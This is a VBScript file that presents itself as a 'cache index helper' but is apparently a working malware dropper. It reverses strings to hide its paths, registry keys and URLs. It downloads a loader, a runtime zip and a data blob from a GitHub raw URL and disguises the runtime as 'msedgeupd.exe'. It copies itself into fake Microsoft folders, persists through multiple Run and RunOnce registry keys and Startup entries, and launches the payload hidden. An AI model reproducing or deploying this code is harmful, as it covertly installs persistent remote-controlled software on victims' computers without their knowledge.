' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Dim sh, fo
Set sh = CreateObject("WScript.Shell")
Set fo = CreateObject("Scripting.FileSystemObject")

Dim AP, RT, ST, P1, P2, P3, K1, K2, K3, K4, K5, PY
Dim RK, SV, TS, OLR, R1, R2, R3, C2, RV2, RO2, T2, RK3, RO3, STLNK
Dim O1, O2, O3, O4, O5, O6, O7, O8, O9, O10
AP = sh.ExpandEnvironmentStrings("%APPDATA%")
RT = StrReverse("tr\sehcaC\swodniW\tfosorciM\%ATADPPALACOL%")
ST = StrReverse("piz.tsider\sehcaC\swodniW\tfosorciM\%ATADPPALACOL%")
P1 = StrReverse("nib.ehcac\syeKenihcaM\ASR\otpyrC\tfosorciM\%ATADPPA%")
P2 = StrReverse("nib.cvsrew\evihcrAtropeR\REW\swodniW\tfosorciM\%ATADPPA%")
P3 = StrReverse("nib.nomhsarc\sehcaC\swodniW\tfosorciM\%ATADPPALACOL%")
K1 = StrReverse("sbv.ehcaCcvS\syeKenihcaM\ASR\otpyrC\tfosorciM\%ATADPPA%")
K2 = StrReverse("sbv.cvSREW\evihcrAtropeR\REW\swodniW\tfosorciM\%ATADPPA%")
K3 = StrReverse("sbv.rgmehcac\sehcaC\swodniW\tfosorciM\%ATADPPALACOL%")
K4 = StrReverse("sbv.cvsniw\tapmoc\stuctrohS krowteN\swodniW\tfosorciM\%ATADPPA%")
K5 = StrReverse("sbv.mdsys\tapmoc\ehcaCteNI\swodniW\tfosorciM\%ATADPPALACOL%")
PY = StrReverse("exe.dpuegdesm")
RK = StrReverse("etadpUegdEtfosorciM\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH")
SV = StrReverse("sbv.etadpUegdEtfosorciM")
TS = StrReverse("eroCetadpUegdEtfosorciM")
OLR = StrReverse("etadpUegdEtfosorciM\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH")
R1 = StrReverse("piz.tsider/niam/selifcm/yrlavachsadpota/moc.tnetnocresubuhtig.war//:sptth")
R2 = StrReverse("tad.yrtemelet/niam/selifcm/yrlavachsadpota/moc.tnetnocresubuhtig.war//:sptth")
R3 = StrReverse("tad.eroc/niam/selifcm/yrlavachsadpota/moc.tnetnocresubuhtig.war//:sptth")
C2 = StrReverse("ehcac.eroc\syeKenihcaM\ASR\otpyrC\tfosorciM\%ATADPPA%")
RV2 = StrReverse("ehcaCegdEtfosorciM\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH")
RO2 = StrReverse("ehcaCegdEtfosorciM\ecnOnuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH")
T2 = StrReverse("2ehcaCegdEtfosorciM")
RK3 = StrReverse("2etadpUegdEtfosorciM\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH")
RO3 = StrReverse("2etadpUegdEtfosorciM\ecnOnuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH")
STLNK = StrReverse("knl.etadpUegdEtfosorciM")
O1 = StrReverse("sbv.toob\ASR\otpyrC\tfosorciM\")
O2 = StrReverse("dmc.repleh-ehcac\ASR\otpyrC\tfosorciM\")
O3 = StrReverse("tab.syeKenihcaM\ASR\otpyrC\tfosorciM\")
O4 = StrReverse("tab.syeksys\tcetorP\tfosorciM\")
O5 = StrReverse("dmc.cvsrew\evihcrAtropeR\REW\swodniW\tfosorciM\")
O6 = StrReverse("dmc.etadpUegdEtfosorciM\")
O7 = StrReverse("dmc.evilapeek\")
O8 = StrReverse("nohtyP\ASR\otpyrC\tfosorciM\")
O9 = StrReverse("exe.lanimreTswodniW")
O10 = StrReverse("exe.lanimreTswodniW\ASR\otpyrC\tfosorciM\")

RT = sh.ExpandEnvironmentStrings(RT)
ST = sh.ExpandEnvironmentStrings(ST)
P1 = sh.ExpandEnvironmentStrings(P1)
P2 = sh.ExpandEnvironmentStrings(P2)
P3 = sh.ExpandEnvironmentStrings(P3)
K1 = sh.ExpandEnvironmentStrings(K1)
K2 = sh.ExpandEnvironmentStrings(K2)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' ensure payload - fetch loader from repo if missing (logic fetched separately at runtime)
Dim PP
PP = fo.GetParentFolderName(P1)
If Not fo.FolderExists(PP) Then fo.CreateFolder PP
If Not fo.FileExists(P1) Then
    DL R2, P1
End If
fo.CopyFile P1, P2, True
fo.CopyFile P1, P3, True

' ensure logic blob cache (core.dat) so the loader always has something to run
Dim CP
CP = fo.GetParentFolderName(C2)
If Not fo.FolderExists(CP) Then fo.CreateFolder CP
If Not fo.FileExists(C2) Then
    DL R3, C2
End If

' clone this helper to the seed mesh (including the anchor)
Dim K
For Each K In Array(K1, K2, K3, K4, K5)
    If K <> WScript.ScriptFullName And Not fo.FileExists(K) Then
        fo.CopyFile WScript.ScriptFullName, K, True
    End If
Next

' triggers
sh.RegWrite RK, "wscript.exe """ & K1 & """", "REG_SZ"
Dim SP
SP = sh.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
If Not fo.FileExists(SP & "\" & SV) Then
    fo.CopyFile WScript.ScriptFullName, SP & "\" & SV, True
End If
sh.RegWrite RV2, "wscript.exe """ & K2 & """", "REG_SZ"
sh.RegWrite RO2, "wscript.exe """ & K1 & """", "REG_SZ"
sh.RegWrite RK3, "wscript.exe """ & K3 & """", "REG_SZ"
sh.RegWrite RO3, "wscript.exe """ & K3 & """", "REG_SZ"
Dim sc
Set sc = sh.CreateShortcut(SP & "\" & STLNK)
sc.TargetPath = sh.ExpandEnvironmentStrings("%windir%\System32\wscript.exe")
sc.Arguments = """" & K1 & """"
sc.WindowStyle = 7
sc.Save

' retire old layout if present
sh.RegDelete OLR
Dim OL
For Each OL In Array(AP & O1, AP & O2, AP & O3, AP & O4, AP & O5, SP & O6, SP & O7)
    If fo.FileExists(OL) Then fo.DeleteFile OL, True
Next
If fo.FolderExists(AP & O8) Then fo.DeleteFolder AP & O8, True
If fo.FileExists(AP & O10) Then sh.Run "taskkill /f /im " & O9, 0, True

' launch payload windowless
If fo.FileExists(P1) Then
    sh.Run """" & RT & "\" & PY & """ """ & P1 & """", 0, False
End If